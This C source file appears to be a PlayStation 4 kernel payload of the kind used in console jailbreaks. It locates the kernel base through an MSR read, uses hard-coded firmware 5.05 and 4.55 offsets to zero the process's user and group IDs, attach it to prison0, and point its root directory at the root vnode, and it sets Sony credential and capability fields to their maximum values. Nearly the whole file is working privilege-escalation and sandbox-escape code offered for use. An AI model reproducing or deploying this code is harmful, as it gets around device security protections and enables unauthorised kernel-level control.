#include <stdint.h>
#include <ps4sdk.h>
#include <debugnet.h>
#define _GNU_SOURCE
#include <unistd.h>
#include <sys/syscall.h>

#define __505__ // define here!


struct filedesc {
    void* useless1[3];
    void* fd_rdir;
    void* fd_jdir;
};

struct proc {
    char useless[64];
    struct ucred* p_ucred;
    struct filedesc* p_fd;
};

struct thread {
    void* useless;
    struct proc* td_proc;
};

struct auditinfo_addr {
    char useless[184];
};

struct ucred {
    uint32_t useless1;
    uint32_t cr_uid;     // effective user id
    uint32_t cr_ruid;    // real user id
    uint32_t useless2;
    uint32_t useless3;
    uint32_t cr_rgid;    // real group id
    uint32_t useless4;
    void* useless5;
    void* useless6;
    void* cr_prison;     // jail(2)
    void* useless7;
    uint32_t useless8;
    void* useless9[2];
    void* useless10;
    struct auditinfo_addr useless11;
    uint32_t* cr_groups; // groups
    uint32_t useless12;
};

/// this work also as payload:
static inline __attribute__((always_inline)) uint64_t __readmsr(unsigned long __register)
{
  unsigned long __edx;
  unsigned long __eax;
  __asm__ ("rdmsr" : "=d"(__edx), "=a"(__eax) : "c"(__register));
  return (((uint64_t)__edx) << 32) | (uint64_t)__eax;
}

#if defined (__505__)
  #warning "using 505 offsets!"
  #define KERN_PRISON_0       0x10986A0
  #define KERN_ROOTVNODE      0x22C1A70
  #define KERN_XFAST_SYSCALL  0x1C0

#elif defined (__455__)
  #warning "using 455 offsets!"
  #define KERN_PRISON_0       0x10399B0
  #define KERN_ROOTVNODE      0x21AFA30
  #define KERN_XFAST_SYSCALL  0x3095D0

#else
  #warning "mo FW defined!!!"
#endif

int unjail(struct thread* td)
{
    struct ucred    *cred;
    struct filedesc *fd;

    fd   = td->td_proc->p_fd;
    cred = td->td_proc->p_ucred;
    // Reading kernel_base...
    void    *kbase = &((uint8_t*)__readmsr(0xC0000082))[-KERN_XFAST_SYSCALL];
    uint8_t *kernel_ptr    = (uint8_t*)kbase;
    void   **got_prison0   = (void**) &kernel_ptr[KERN_PRISON_0];
    void   **got_rootvnode = (void**) &kernel_ptr[KERN_ROOTVNODE];

    cred->cr_uid       = 0;
    cred->cr_ruid      = 0;
    cred->cr_rgid      = 0;
    cred->cr_groups[0] = 0;
    cred->cr_prison    = *got_prison0;

    fd->fd_rdir = fd->fd_jdir = *got_rootvnode;
    // escalate ucred privs, needed for access to the filesystem ie* mounting & decrypting files
    void     *td_ucred    = *(void**)(((char*)td) + 304);  // p_ucred == td_ucred
    // sceSblACMgrIsSystemUcred
    uint64_t *sonyCred    = (uint64_t*)(((char*)td_ucred) + 96);
    *sonyCred    = 0xffffffffffffffff;
    // sceSblACMgrGetDeviceAccessType
    uint64_t *sceProcType = (uint64_t*)(((char*)td_ucred) + 88);
    *sceProcType = 0x3801000000000013;  // Max access
    // sceSblACMgrHasSceProcessCapability
    uint64_t *sceProcCap  = (uint64_t*)(((char*)td_ucred) + 104);
    *sceProcCap  = 0xffffffffffffffff;  // Sce Process
    return 0;
}


void escalate_priv(void)
{
    syscall(11, &unjail);
}
